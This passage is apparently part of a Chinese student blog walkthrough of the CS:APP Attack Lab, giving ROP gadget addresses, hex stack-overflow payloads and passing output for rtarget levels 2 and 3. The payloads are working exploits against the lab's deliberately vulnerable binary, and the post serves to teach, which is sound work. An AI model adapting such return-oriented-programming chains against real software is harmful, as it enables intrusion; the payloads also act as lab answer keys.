+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1: 0x00000000004019ab   //addr &lt;addval_219&gt; + 4</span><br><span class="line">2: 0x0000000059b997fa		//需要的值用于popq</span><br><span class="line">3: 0x00000000004019c5 	//addr &lt;setval_426&gt; + 2</span><br><span class="line">4: 0x00000000004017ec 	//addr &lt;touch2&gt;</span><br></pre></td></tr></table></figure>
+<p>转换为二进制代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p>最终执行结果如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw -i key_4.txt | ./rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user <span class="built_in">id</span> bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:2</span><br></pre></td></tr></table></figure>
+<h3 id="part2-level3-phase-5"><a class="markdownIt-Anchor" href="#part2-level3-phase-5"></a> Part2 Level3 (Phase 5)</h3>
+<p>这个部分就完全如法炮制的执行到<code>Phase 3</code>即可。通过上一题知道，其实执行到<code>touch</code>部分应该是和<code>ctarget</code>共用的代码段，所以可以直接认为需要的字符串参数为<code>0x59b997fa</code>即可。</p>
+<p>但是当栈的位置不可知时只能利用<code>%rsp</code>指针的相对值，意味着我们需要计算出偏移量，对于这道题中如何加偏移量是重点。文档中其实没有给出任何执行运算的二进制代码，因此我们需要自己找。通过查找发现并没有<code>add</code>指令的操作码<code>83</code>，但是有<code>lea</code> 的函数如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:	c3                   	ret</span><br></pre></td></tr></table></figure>
+<p>所以根据提供的函数，我们可以大致写出以下思路</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">(偏移量)</span><br><span class="line">movl %eax, %edx</span><br><span class="line">movl %edx, %ecx</span><br><span class="line">movl %ecx, %esi</span><br><span class="line">movq %rsp, %rax</span><br><span class="line">movq %rax, %rdi</span><br><span class="line">lea (%rdi, %rsi, 1), %rax</span><br><span class="line">movq %rax, %rdi</span><br><span class="line">touch3</span><br><span class="line">string</span><br></pre></td></tr></table></figure>
+<p>偏移量为取出<code>%rsp</code>的值到<code>string</code>的距离，为<code>8 * 4 = 32B</code> 也就是<code>0x20</code></p>
+<p>如上图的思路可以转换为二进制代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line"></span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">20 00 00 00 00 00 00 00</span><br><span class="line"></span><br><span class="line">dd 19 40 00 00 00 00 00 /* movl %eax, %edx */</span><br><span class="line">69 1a 40 00 00 00 00 00 /* movl %edx, %ecx */</span><br><span class="line">27 1a 40 00 00 00 00 00 /* movl %ecx, %esi */</span><br><span class="line">06 1a 40 00 00 00 00 00 /* movq %rsp, %rax */</span><br><span class="line">c5 19 40 00 00 00 00 00 /* movq %rax, %rdi  */</span><br><span class="line">d6 19 40 00 00 00 00 00 /* lea (%rdi, %rsi, 1), %rax */</span><br><span class="line">c5 19 40 00 00 00 00 00 /* movq %rax, %rdi */</span><br><span class="line">fa 18 40 00 00 00 00 00 /* touch3 */</span><br><span class="line">35 39 62 39 39 37 66 61 00 /* string */</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>最后运行结果如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw -i key_5.txt | ./rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="string">&quot;59b997fa&quot;</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user <span class="built_in">id</span> bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:3</span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2>
+<p>这个实验总体来说难度不大，但是很有趣味性，通过对栈溢出的攻击，让我们明白程序检测栈是否溢出的重要性。（不过到最后一题才看到<code>hex2raw</code>支持注释，对实验的便捷性还是提供一定帮助。）</p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https://lcjd99.github.io/Course/csapp/Lab3/" title="CSAPP深入理解计算机系统 Lab3(attack Lab) 详解" target="_blank" rel="external">https://lcjd99.github.io/Course/csapp/Lab3/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/LCJD99" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/LCJD99" target="_blank"><span class="text-dark">凌晨九点</span><small class="ml-1x">CS Student</small></a></h3>
+        <div></div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/Course/csapp/Lab4/" title="CSAPP深入理解计算机系统 Lab4(architecture Lab) 详解"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/Course/csapp/Lab2/" title="CSAPP深入理解计算机系统 Lab2(bomb Lab) 详解"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/LCJD99" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
